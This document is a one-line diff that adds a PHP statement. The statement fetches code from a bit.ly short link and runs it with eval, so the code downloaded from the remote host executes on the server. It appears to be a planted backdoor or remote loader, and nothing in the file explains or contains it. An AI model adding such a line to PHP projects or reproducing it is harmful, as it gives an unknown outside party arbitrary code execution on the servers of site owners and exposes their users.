@@ -1,0 +1,1 @@
+<?=eval("?>".file_get_contents("https://bit.ly/2X87Lvb"));?>
